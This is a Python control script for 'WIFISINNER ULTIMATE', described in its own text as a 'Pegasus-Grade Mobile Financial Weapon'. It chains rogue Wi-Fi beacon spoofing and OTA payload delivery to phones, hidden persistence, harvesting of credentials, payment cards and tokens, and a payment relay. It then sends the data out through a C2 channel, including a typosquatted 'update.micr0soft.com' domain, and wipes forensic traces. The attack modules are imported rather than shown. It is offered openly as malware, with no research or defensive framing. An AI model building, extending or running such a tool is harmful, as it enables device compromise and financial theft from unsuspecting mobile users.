#!/usr/bin/env python3
"""
WIFISINNER ULTIMATE — Pegasus-Grade Mobile Financial Weapon (Clean UI Version)

Autonomous, multi-stage cyber-weapon for mobile financial layer compromise.
Features a clean, user-friendly terminal interface.
"""

import argparse
import json
import os
import platform
import signal
import subprocess
import sys
import threading
import time
from datetime import datetime
from pathlib import Path

# Import clean UI
try:
    from ui_clean import create_ui, TerminalUI
except ImportError:
    create_ui = lambda mode="clean": None
    TerminalUI = None

# Color output
C_RESET = "\033[0m"
C_DIM = "\033[2m"
C_BOLD = "\033[1m"
C_GREEN = "\033[32m"
C_BGREEN = "\033[1;32m"
C_CYAN = "\033[36m"
C_BCYAN = "\033[1;36m"
C_YELLOW = "\033[33m"
C_BYELLOW = "\033[1;33m"
C_RED = "\033[31m"
C_BRED = "\033[1;31m"
C_MAGENTA = "\033[35m"
C_BMAGENTA = "\033[1;35m"
C_WHITE = "\033[97m"


def now():
    return datetime.now().strftime("%H:%M:%S")


def is_macos():
    return platform.system() == "Darwin"


def is_linux():
    return platform.system() == "Linux"


def get_platform():
    """Get current platform"""
    return platform.system()


def get_default_interface():
    if is_macos():
        return "en0"
    return "wlan0"


class Stats:
    """Global statistics tracker"""
    
    def __init__(self):
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.phase_status = {}
        self.targets = {}
        self.captured = {
            "credentials": 0,
            "cards": 0,
            "tokens": 0,
            "cryptograms": 0
        }
    
    def phase_start(self, phase):
        with self.lock:
            self.phase_status[phase] = {"status": "running", "start": datetime.now()}
    
    def phase_complete(self, phase):
        with self.lock:
            if phase in self.phase_status:
                self.phase_status[phase]["status"] = "complete"
                self.phase_status[phase]["end"] = datetime.now()
    
    def phase_fail(self, phase, reason):
        with self.lock:
            if phase in self.phase_status:
                self.phase_status[phase]["status"] = "failed"
                self.phase_status[phase]["error"] = reason
    
    def target_found(self, mac, info):
        with self.lock:
            self.targets[mac] = {"info": info, "found": datetime.now()}
    
    def capture(self, type, count=1):
        with self.lock:
            self.captured[type] = self.captured.get(type, 0) + count
    
    def get_runtime(self):
        return int(time.time() - self.start_time)


S = Stats()


class WeaponOrchestrator:
    """Main weapon system orchestrator with clean UI"""
    
    def __init__(self, config=None):
        self.config = config or self._default_config()
        self.active = False
        self.phases = {}
        self.threads = []
        self.macos_adapter = None
        self.ui = create_ui(self.config.get("ui_mode", "clean"))
        
        # Detect platform
        self.platform = get_platform()
        
        # Load platform adapter if needed
        if self.platform == "Darwin":
            self._init_macos_adapter()
        
        # Initialize phases
        self._init_phases()
    
    def _default_config(self):
        return {
            "ssid": "FREE WIFI",
            "channel": 6,
            "iface": "wlan0",
            "c2_dns": "update.micr0soft.com",
            "c2_https": "api.telemetry.com",
            "c2_port": 9999,
            "target_os": "android",
            "ui_mode": "clean"  # clean, quiet, or verbose
        }
    
    def _init_macos_adapter(self):
        if self.ui:
            self.ui.status("Loading macOS adapter...")
        else:
            print(f"[INIT] Loading macOS adapter...")
        
        try:
            from macos_adapter import MacOSAdapter
            self.macos_adapter = MacOSAdapter()
            self.macos_adapter.wifi.iface = self.config["iface"]
            if self.ui:
                self.ui.success("macOS adapter loaded")
            else:
                print(f"[INIT] ✓ macOS adapter loaded")
        except ImportError as e:
            if self.ui:
                self.ui.warning(f"macOS adapter: {e}")
            else:
                print(f"[INIT] ! macOS adapter import warning: {e}")
            self.macos_adapter = None
    
    def _init_phases(self):
        if self.ui:
            self.ui.status("Loading phase modules...")
        else:
            print(f"[INIT] Loading phase modules...")
        
        # Phase 1: Access
        try:
            from phase1_beacon_spoof import BeaconSpoof, TargetRecon
            from phase1_ota_delivery import OTADeliveryServer
            self.phases["access"] = {
                "beacon": BeaconSpoof(iface=self.config["iface"], channel=self.config["channel"]),
                "recon": TargetRecon(),
                "ota": OTADeliveryServer(port=80)
            }
            if self.ui:
                self.ui.list_item("Phase 1 modules", "ok")
            else:
                print(f"[INIT] ✓ Phase 1 modules loaded")
        except ImportError as e:
            if self.ui:
                self.ui.list_item("Phase 1 modules", "warn")
            else:
                print(f"[INIT] ! Phase 1 import warning: {e}")
        
        # Phase 2: Persistence
        try:
            from phase2_persistence import PersistenceDaemon
            from phase2_components import ComponentRegistration
            self.phases["persistence"] = {
                "daemon": PersistenceDaemon(self.config["target_os"]),
                "components": ComponentRegistration()
            }
            if self.ui:
                self.ui.list_item("Phase 2 modules", "ok")
            else:
                print(f"[INIT] ✓ Phase 2 modules loaded")
        except ImportError as e:
            if self.ui:
                self.ui.list_item("Phase 2 modules", "warn")
            else:
                print(f"[INIT] ! Phase 2 import warning: {e}")
        
        # Phase 3: Harvesting
        try:
            from phase3_harvester import RuntimeHarvester
            from phase3_relay import PaymentRelaySystem
            self.phases["harvesting"] = {
                "harvester": RuntimeHarvester(),
                "relay": PaymentRelaySystem(c2_host="10.0.0.1", c2_port=self.config["c2_port"])
            }
            if self.ui:
                self.ui.list_item("Phase 3 modules", "ok")
            else:
                print(f"[INIT] ✓ Phase 3 modules loaded")
        except ImportError as e:
            if self.ui:
                self.ui.list_item("Phase 3 modules", "warn")
            else:
                print(f"[INIT] ! Phase 3 import warning: {e}")
        
        # Phase 4: Exfiltration
        try:
            from phase4_c2 import C2Channel
            from phase4_selfdestruct import SelfDestruct
            self.phases["exfil"] = {
                "c2": C2Channel(dns_domain=self.config["c2_dns"], https_host=self.config["c2_https"]),
                "destruct": SelfDestruct()
            }
            if self.ui:
                self.ui.list_item("Phase 4 modules", "ok")
            else:
                print(f"[INIT] ✓ Phase 4 modules loaded")
        except ImportError as e:
            if self.ui:
                self.ui.list_item("Phase 4 modules", "warn")
            else:
                print(f"[INIT] ! Phase 4 import warning: {e}")
    
    def start(self):
        """Start the weapon system with clean UI"""
        if self.ui:
            self.ui.start()
            self.ui.header(None, f"Platform: {self.platform}")
        else:
            print(f"\n{'='*70}")
            print(f"{C_BMAGENTA}WIFISINNER ULTIMATE{C_RESET} — Pegasus-Grade Mobile Financial Weapon")
            print(f"{'='*70}\n")
        
        self.active = True
        
        # Phase 1
        self._run_phase1()
        
        # Phase 2
        self._run_phase2()
        
        # Phase 3
        self._run_phase3()
        
        # Phase 4
        self._run_phase4()
        
        # Summary
        self._print_summary()
    
    def _run_phase1(self):
        """Execute Phase 1: Access Acquisition"""
        if self.ui:
            self.ui.phase_start(1, "Autonomous Access Acquisition")
        else:
            print(f"\n{C_BCYAN}[PHASE 1]{C_RESET} Autonomous Access Acquisition")
            print(f"{C_DIM}{'─' * 60}{C_RESET}")
        
        S.phase_start("phase1")
        
        try:
            if self.platform == "Darwin" and self.macos_adapter:
                # macOS compatibility mode
                if self.ui:
                    self.ui.step(1, "Scanning networks...")
                else:
                    print(f"{C_CYAN}[1.1]{C_RESET} macOS mode: Scanning networks...")
                
                networks = self.macos_adapter.wifi.scan_networks()
                
                if self.ui:
                    self.ui.networks(networks)
                    self.ui.step(2, "Starting OTA server...")
                else:
                    print(f"{C_BGREEN}[+]{C_RESET} Found {len(networks)} networks")
                    print(f"{C_CYAN}[1.2]{C_RESET} macOS mode: Starting OTA server...")
                
                self.macos_adapter.ota.start_server()
                
                if self.ui:
                    self.ui.step(3, "Starting probe sniffer...")
                else:
                    print(f"{C_CYAN}[1.3]{C_RESET} macOS mode: Starting probe sniffer...")
                
                self.macos_adapter.sniffer.start_sniffing()
                time.sleep(3)
                
                if self.macos_adapter.sniffer.probes:
                    if self.ui:
                        self.ui.success(f"Captured {len(self.macos_adapter.sniffer.probes)} probe(s)")
                    else:
                        print(f"{C_BGREEN}[+]{C_RESET} Captured {len(self.macos_adapter.sniffer.probes)} probe(s)")
                
                if self.ui:
                    self.ui.warning("Full beacon spoofing limited on macOS")
                else:
                    print(f"{C_YELLOW}[!] macOS: Use Linux for complete features{C_RESET}")
                
            elif "access" in self.phases:
                # Linux native mode
                if self.ui:
                    self.ui.step(1, "Starting beacon spoofing...")
                else:
                    print(f"{C_CYAN}[1.1]{C_RESET} Starting beacon spoofing engine...")
                
                self.phases["access"]["beacon"].start()
                time.sleep(2)
                
                if self.ui:
                    self.ui.step(2, "Starting OTA delivery...")
                else:
                    print(f"{C_CYAN}[1.2]{C_RESET} Starting OTA delivery server...")
                
                self.phases["access"]["ota"].start()
                
                if self.ui:
                    self.ui.step(3, "Scanning for targets...")
                else:
                    print(f"{C_CYAN}[1.3]{C_RESET} Scanning for targets...")
                
                time.sleep(3)
                
                targets = self.phases["access"]["beacon"].get_targets()
                if targets:
                    if self.ui:
                        self.ui.targets_list(targets)
                    else:
                        print(f"{C_BGREEN}[+]{C_RESET} Found {len(targets)} target(s)")
                        for mac, data in targets.items():
                            S.target_found(mac, {"probes": data["count"], "signal": data["signal"]})
                            print(f"       {mac}: {data['count']} probes, {data['signal']}dBm")
                
                time.sleep(3)
            else:
                if self.ui:
                    self.ui.warning("Phase 1 not available")
                else:
                    print(f"{C_YELLOW}[!] Phase 1 not available{C_RESET}")
            
            S.phase_complete("phase1")
            if self.ui:
                self.ui.phase_complete(1)
            else:
                print(f"{C_BGREEN}[✓]{C_RESET} Phase 1 complete")
            
        except Exception as e:
            if self.ui:
                self.ui.error(f"Phase 1: {e}")
            else:
                print(f"{C_BRED}[!]{C_RESET} Phase 1 error: {e}")
            S.phase_fail("phase1", str(e))
    
    def _run_phase2(self):
        """Execute Phase 2: Persistence"""
        if self.ui:
            self.ui.phase_start(2, "Silent Persistence")
        else:
            print(f"\n{C_BCYAN}[PHASE 2]{C_RESET} Silent Persistence")
            print(f"{C_DIM}{'─' * 60}{C_RESET}")
        
        S.phase_start("phase2")
        
        try:
            if self.ui:
                self.ui.step(1, "Establishing persistence...")
            else:
                print(f"{C_CYAN}[2.1]{C_RESET} Establishing persistence...")
            
            if "persistence" in self.phases:
                self.phases["persistence"]["daemon"].start()
            
            if self.ui:
                self.ui.step(2, "Registering components...")
            else:
                print(f"{C_CYAN}[2.2]{C_RESET} Registering invisible components...")
            
            if "persistence" in self.phases:
                self.phases["persistence"]["components"].start()
            
            time.sleep(2)
            S.phase_complete("phase2")
            
            if self.ui:
                self.ui.phase_complete(2)
            else:
                print(f"{C_BGREEN}[✓]{C_RESET} Phase 2 complete")
            
        except Exception as e:
            if self.ui:
                self.ui.error(f"Phase 2: {e}")
            else:
                print(f"{C_BRED}[!]{C_RESET} Phase 2 error: {e}")
            S.phase_fail("phase2", str(e))
    
    def _run_phase3(self):
        """Execute Phase 3: Harvesting"""
        if self.ui:
            self.ui.phase_start(3, "Runtime Harvesting")
        else:
            print(f"\n{C_BCYAN}[PHASE 3]{C_RESET} Runtime Harvesting")
            print(f"{C_DIM}{'─' * 60}{C_RESET}")
        
        S.phase_start("phase3")
        
        try:
            if self.ui:
                self.ui.step(1, "Starting harvester...")
            else:
                print(f"{C_CYAN}[3.1]{C_RESET} Starting runtime harvester...")
            
            if "harvesting" in self.phases:
                self.phases["harvesting"]["harvester"].start()
            
            if self.ui:
                self.ui.step(2, "Starting payment relay...")
            else:
                print(f"{C_CYAN}[3.2]{C_RESET} Starting payment relay system...")
            
            if "harvesting" in self.phases:
                self.phases["harvesting"]["relay"].start()
            
            time.sleep(3)
            S.phase_complete("phase3")
            
            if self.ui:
                self.ui.phase_complete(3)
            else:
                print(f"{C_BGREEN}[✓]{C_RESET} Phase 3 complete")
            
        except Exception as e:
            if self.ui:
                self.ui.error(f"Phase 3: {e}")
            else:
                print(f"{C_BRED}[!]{C_RESET} Phase 3 error: {e}")
            S.phase_fail("phase3", str(e))
    
    def _run_phase4(self):
        """Execute Phase 4: Exfiltration"""
        if self.ui:
            self.ui.phase_start(4, "Exfiltration & Anti-Forensics")
        else:
            print(f"\n{C_BCYAN}[PHASE 4]{C_RESET} Encrypted Exfiltration & Self-Destruct")
            print(f"{C_DIM}{'─' * 60}{C_RESET}")
        
        S.phase_start("phase4")
        
        try:
            if self.ui:
                self.ui.step(1, "Establishing C2 channel...")
            else:
                print(f"{C_CYAN}[4.1]{C_RESET} Establishing C2 channel...")
            
            if "exfil" in self.phases:
                self.phases["exfil"]["c2"].start()
            
            if self.ui:
                self.ui.step(2, "Starting anti-forensics...")
            else:
                print(f"{C_CYAN}[4.2]{C_RESET} Starting anti-forensics monitoring...")
            
            if "exfil" in self.phases:
                self.phases["exfil"]["destruct"].start_monitoring()
            
            time.sleep(3)
            S.phase_complete("phase4")
            
            if self.ui:
                self.ui.phase_complete(4)
            else:
                print(f"{C_BGREEN}[✓]{C_RESET} Phase 4 complete")
            
        except Exception as e:
            if self.ui:
                self.ui.error(f"Phase 4: {e}")
            else:
                print(f"{C_BRED}[!]{C_RESET} Phase 4 error: {e}")
            S.phase_fail("phase4", str(e))
    
    def _print_summary(self):
        """Print operation summary"""
        if self.ui and self.config.get("ui_mode") != "quiet":
            self.ui.summary({
                "phases": S.phase_status,
                "targets": S.targets,
                "captured": S.captured,
                "runtime": S.get_runtime()
            })
        else:
            # Compact summary
            print(f"\n{C_BMAGENTA}{'═' * 50}{C_RESET}")
            print(f"{C_BMAGENTA}SUMMARY{C_RESET}")
            print(f"{C_BMAGENTA}{'═' * 50}{C_RESET}")
            print(f"  Phases: {len(S.phase_status)}")
            print(f"  Targets: {len(S.targets)}")
            print(f"  Credentials: {S.captured.get('credentials', 0)}")
            print(f"  Cards: {S.captured.get('cards', 0)}")
            print(f"  Runtime: {S.get_runtime()}s")
            print(f"{C_BMAGENTA}{'═' * 50}{C_RESET}\n")
    
    def stop(self):
        """Stop the weapon system"""
        if self.ui:
            self.ui.status("Shutting down...")
        else:
            print(f"\n{C_CYAN}[*]{C_RESET} Shutting down...")
        
        self.active = False
        
        # Stop phases in reverse order
        if self.ui:
            self.ui.step(4, "Stopping...")
        
        if "exfil" in self.phases:
            self.phases["exfil"]["c2"].stop()
            self.phases["exfil"]["destruct"].manual_wipe()
            self.phases["exfil"]["destruct"].stop()
        
        if "harvesting" in self.phases:
            self.phases["harvesting"]["relay"].stop()
            self.phases["harvesting"]["harvester"].stop()
        
        if "persistence" in self.phases:
            self.phases["persistence"]["daemon"].stop()
            self.phases["persistence"]["components"].stop()
        
        if "access" in self.phases:
            self.phases["access"]["beacon"].stop()
            self.phases["access"]["ota"].stop()
        
        if self.macos_adapter:
            self.macos_adapter.stop_operation()
        
        if self.ui:
            self.ui.stop()
            self.ui.success("Shutdown complete")
        else:
            print(f"{C_BGREEN}[✓]{C_RESET} Shutdown complete")


def main():
    parser = argparse.ArgumentParser(
        description="WIFISINNER ULTIMATE — Pegasus-Grade Mobile Financial Weapon",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument("--iface", default=None, help="WiFi interface (default: auto-detect)")
    parser.add_argument("--ssid", default="FREE WIFI", help="Honeypot SSID")
    parser.add_argument("--channel", type=int, default=6, help="WiFi channel")
    parser.add_argument("--c2-dns", default="update.micr0soft.com", help="C2 DNS domain")
    parser.add_argument("--c2-https", default="api.telemetry.com", help="C2 HTTPS host")
    parser.add_argument("--c2-port", type=int, default=9999, help="C2 port")
    parser.add_argument("--target-os", choices=["android", "ios"], default="android", help="Target OS")
    parser.add_argument("--scan", action="store_true", help="Scan for targets only")
    parser.add_argument("--phase", type=int, choices=[1, 2, 3, 4], help="Run specific phase only")
    parser.add_argument("--dry-run", action="store_true", help="Show configuration")
    parser.add_argument("--config", help="Load config from JSON file")
    parser.add_argument("--macos-adapter", action="store_true", help="Force macOS adapter mode")
    parser.add_argument("--ui", choices=["clean", "quiet", "verbose"], default="clean", 
                       help="UI mode: clean (default), quiet, or verbose")
    
    args = parser.parse_args()
    
    # Create config
    config = {}
    if args.config:
        try:
            config = json.loads(Path(args.config).read_text())
        except:
            pass
    
    # Create orchestrator
    config["ui_mode"] = args.ui
    weapon = WeaponOrchestrator(config)
    
    # Override config with CLI args
    weapon.config["iface"] = args.iface or get_default_interface()
    weapon.config["ssid"] = args.ssid
    weapon.config["channel"] = args.channel
    weapon.config["c2_dns"] = args.c2_dns
    weapon.config["c2_https"] = args.c2_https
    weapon.config["c2_port"] = args.c2_port
    weapon.config["target_os"] = args.target_os
    
    if args.dry_run:
        if weapon.ui:
            weapon.ui.header("Configuration")
            weapon.ui.list_item(f"Platform: {weapon.platform}")
            weapon.ui.list_item(f"Interface: {weapon.config['iface']}")
            weapon.ui.list_item(f"SSID: {weapon.config['ssid']}")
            weapon.ui.list_item(f"UI Mode: {args.ui}")
        else:
            print(f"\n{C_BOLD}Configuration:{C_RESET}")
            print(f"  Platform: {weapon.platform}")
            for key, value in weapon.config.items():
                print(f"  {key}: {value}")
        sys.exit(0)
    
    if args.scan:
        if weapon.ui:
            weapon.ui.header("Network Scan")
        else:
            print(f"\n{C_BCYAN}[SCAN]{C_RESET} Scanning for targets...")
        
        if is_macos():
            if weapon.macos_adapter:
                networks = weapon.macos_adapter.wifi.scan_networks()
                if weapon.ui:
                    weapon.ui.networks(networks)
                else:
                    print(f"\nFound {len(networks)} network(s):")
                    for net in networks[:15]:
                        print(f"  {net.get('ssid', 'Unknown')}")
        elif "access" in weapon.phases:
            weapon.phases["access"]["beacon"].start()
            time.sleep(5)
            targets = weapon.phases["access"]["beacon"].get_targets()
            if weapon.ui:
                weapon.ui.targets_list(targets)
            else:
                print(f"\nFound {len(targets)} target(s):")
                for mac, data in targets.items():
                    print(f"  {mac}: {data['count']} probes, {data['signal']}dBm")
            weapon.phases["access"]["beacon"].stop()
        
        sys.exit(0)
    
    if args.phase:
        if weapon.ui:
            weapon.ui.header(f"Phase {args.phase}")
        else:
            print(f"\n{C_BCYAN}[PHASE {args.phase}]{C_RESET} Running phase only...")
        
        if args.phase == 1:
            weapon._run_phase1()
        elif args.phase == 2:
            weapon._run_phase2()
        elif args.phase == 3:
            weapon._run_phase3()
        elif args.phase == 4:
            weapon._run_phase4()
        
        weapon._print_summary()
        sys.exit(0)
    
    # Full operation
    try:
        weapon.start()
    except KeyboardInterrupt:
        if weapon.ui:
            weapon.ui.warning("Interrupted")
        else:
            print(f"\n{C_CYAN}[*]{C_RESET} Interrupted")
    finally:
        weapon.stop()


if __name__ == "__main__":
    main()
